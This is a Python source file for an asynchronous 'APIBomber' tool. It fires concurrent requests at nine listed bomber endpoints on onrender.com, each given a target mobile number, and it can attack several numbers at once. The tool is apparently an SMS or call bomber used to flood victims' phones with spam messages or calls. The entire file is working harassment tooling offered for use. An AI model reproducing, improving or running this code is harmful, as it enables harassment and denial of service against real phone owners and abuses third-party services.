import asyncio
import aiohttp
import logging
from typing import List, Dict, Any
from datetime import datetime

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class APIBomber:
    def __init__(self, max_concurrent=10):
        self.max_concurrent = max_concurrent
        self.semaphore = asyncio.Semaphore(max_concurrent)
        
        # List of APIs to call
        self.apis = [
            {"url": "https://bomberr.onrender.com/num={mobile}", "name": "Bomberr"},
            {"url": "https://darzz-mixx.onrender.com/api/time3.php?mobile={mobile}", "name": "Darzz Time3"},
            {"url": "https://darzz-mixx.onrender.com/api/time11.php?mobile={mobile}", "name": "Darzz Time11"},
            {"url": "https://darzz-mixx.onrender.com/api/time5.php?mobile={mobile}", "name": "Darzz Time5"},
            {"url": "https://darzz-mixx.onrender.com/api/time21.php?mobile={mobile}", "name": "Darzz Time21"},
            {"url": "https://darzz-mixx.onrender.com/api/time6.php?mobile={mobile}", "name": "Darzz Time6"},
            {"url": "https://darzz-mixx.onrender.com/api/time2.php?mobile={mobile}", "name": "Darzz Time2"},
            {"url": "https://darzz-mixx.onrender.com/api/time4.php?mobile={mobile}", "name": "Darzz Time4"},
            {"url": "https://darzz-mixx.onrender.com/api/time1.php?mobile={mobile}", "name": "Darzz Time1"},
        ]
    
    async def call_api(self, session: aiohttp.ClientSession, api_config: Dict[str, str], mobile: str) -> Dict[str, Any]:
        """Call a single API with timeout handling"""
        async with self.semaphore:
            url = api_config["url"].format(mobile=mobile)
            api_name = api_config["name"]
            
            try:
                start_time = datetime.now()
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    elapsed = (datetime.now() - start_time).total_seconds()
                    status = response.status
                    
                    try:
                        text = await response.text()
                    except:
                        text = "Could not read response"
                    
                    return {
                        "api": api_name,
                        "url": url,
                        "status": status,
                        "success": 200 <= status < 300,
                        "response": text[:200],
                        "time": f"{elapsed:.2f}s"
                    }
                    
            except asyncio.TimeoutError:
                return {
                    "api": api_name,
                    "url": url,
                    "status": 408,
                    "success": False,
                    "response": "Timeout",
                    "time": ">10s"
                }
            except Exception as e:
                logger.error(f"Error for {api_name}: {e}")
                return {
                    "api": api_name,
                    "url": url,
                    "status": 500,
                    "success": False,
                    "response": str(e)[:100],
                    "time": "error"
                }
    
    async def bomb_number(self, mobile: str) -> List[Dict[str, Any]]:
        """Call all APIs for a single number"""
        async with aiohttp.ClientSession() as session:
            tasks = [self.call_api(session, api, mobile) for api in self.apis]
            results = await asyncio.gather(*tasks)
            return results
    
    async def bomb_multiple_numbers(self, numbers: List[str]) -> Dict[str, List[Dict[str, Any]]]:
        """Bomb multiple numbers simultaneously"""
        tasks = [self.bomb_number(number) for number in numbers]
        results = await asyncio.gather(*tasks)
        
        result_dict = {}
        for number, result in zip(numbers, results):
            result_dict[number] = result
        
        return result_dict